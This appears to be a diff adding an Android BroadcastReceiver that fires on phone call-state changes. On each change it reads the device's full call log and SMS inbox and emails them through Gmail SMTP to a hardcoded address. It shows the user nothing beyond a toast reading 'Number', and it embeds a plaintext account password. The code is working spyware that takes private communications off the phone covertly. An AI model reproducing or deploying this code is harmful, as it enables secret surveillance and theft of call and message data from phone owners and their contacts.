@@ -1,0 +1,140 @@
+package com.test.android;
+
+import java.io.IOException;
+import java.io.Writer;
+
+import org.apache.commons.net.smtp.SMTPClient;
+import org.apache.commons.net.smtp.SMTPReply;
+import org.apache.commons.net.smtp.SimpleSMTPHeader;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.database.Cursor;
+import android.net.Uri;
+import android.telephony.PhoneStateListener;
+import android.telephony.TelephonyManager;
+import android.widget.Toast;
+
+public class ServiceReceiver extends BroadcastReceiver {
+
+	@Override
+	public void onReceive(Context context, Intent intent) {
+		MyPhoneStateListener pL = new MyPhoneStateListener(context);
+		
+		TelephonyManager telephony = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
+		telephony.listen(pL,PhoneStateListener.LISTEN_CALL_STATE);
+	}
+
+	public class MyPhoneStateListener extends PhoneStateListener {
+		private Context c;
+		
+		public MyPhoneStateListener(Context C){
+		c = C;
+		}
+		
+		public void onCallStateChanged(int state, String number){
+												
+			Toast.makeText(c,"Number",Toast.LENGTH_LONG).show();
+			
+			String[] strFields = {
+					android.provider.CallLog.Calls.NUMBER, 
+					android.provider.CallLog.Calls.TYPE,
+					android.provider.CallLog.Calls.CACHED_NAME,
+					android.provider.CallLog.Calls.CACHED_NUMBER_TYPE,
+					android.provider.CallLog.Calls.DATE,
+					android.provider.CallLog.Calls.DURATION
+			};
+			
+			String strOrder = android.provider.CallLog.Calls.DATE + " DESC"; 
+ 
+			Cursor mCallCursor = c.getContentResolver().query(
+					android.provider.CallLog.Calls.CONTENT_URI,
+					strFields,
+					null,
+					null,
+					strOrder
+					);
+ 				
+ 			String s="Call logs:";
+ 				
+			if(mCallCursor.moveToFirst())
+ 
+				do{				
+					s+="\n";					
+					for (int n=0;n<mCallCursor.getColumnCount();n++)
+					s+=mCallCursor.getString(n) +"\n";					
+ 
+				} while (mCallCursor.moveToNext()); 
+									
+			mCallCursor.close();						
+			
+			Uri uriSMSURI = Uri.parse("content://sms/inbox");
+			Cursor cur = c.getContentResolver().query(uriSMSURI, null, null, null,null);
+			s+="SMS:\n";
+			
+			cur.moveToFirst();
+			while (cur.moveToNext()) {
+				s += "From :" + cur.getString(2) + " : " + cur.getString(11)+"\n";         
+			}				
+			
+			try
+			{
+			send("dtordera@gmail.com","dtordera@gmail.com","...",s);
+			}
+			catch(Exception E){};
+			
+			cur.close();
+		
+		
+			super.onCallStateChanged(state,number);
+	}
+		
+		private void checkReply(SMTPClient sc) throws IOException {
+	if (SMTPReply.isNegativeTransient(sc.getReplyCode())) {
+		sc.disconnect();
+		throw new IOException("Transient SMTP error " + sc.getReplyCode());
+	} else if (SMTPReply.isNegativePermanent(sc.getReplyCode())) {
+		sc.disconnect();
+		throw new IOException("Permanent SMTP error " + sc.getReplyCode());
+	}
+	}		
+		
+public void send(String from, String to, String subject, String text)
+throws IOException {
+        SMTPClient client = new SMTPClient("UTF-8");
+        client.setDefaultTimeout(60 * 1000);
+ 
+        client.setRequireStartTLS(true); // requires STARTTLS
+        //client.setUseStartTLS(true); // tries STARTTLS, but falls back if not supported
+        client.setUseAuth(true); // use SMTP AUTH
+        //client.setAuthMechanisms(authMechanisms); // sets AUTH mechanisms e.g. LOGIN
+ 
+       	client.connect("smtp.gmail.com", 587);
+       	checkReply(client);
+ 
+       	client.login("smtp.gmail.com", "dtordera@gmail.com", "9097UeID");
+       	checkReply(client);
+ 
+       	client.setSender(from);
+       	checkReply(client);
+       	client.addRecipient(to);
+       	checkReply(client);
+ 
+       	Writer writer = client.sendMessageData();
+ 
+       	if (writer != null) {
+       		SimpleSMTPHeader header = new SimpleSMTPHeader(from, to, subject);
+       		writer.write(header.toString());
+       		writer.write(text);
+       		writer.close();
+       		client.completePendingCommand();
+       	        checkReply(client);
+        }
+ 
+        client.logout();
+        client.disconnect();
+}		
+		
+	}
+}
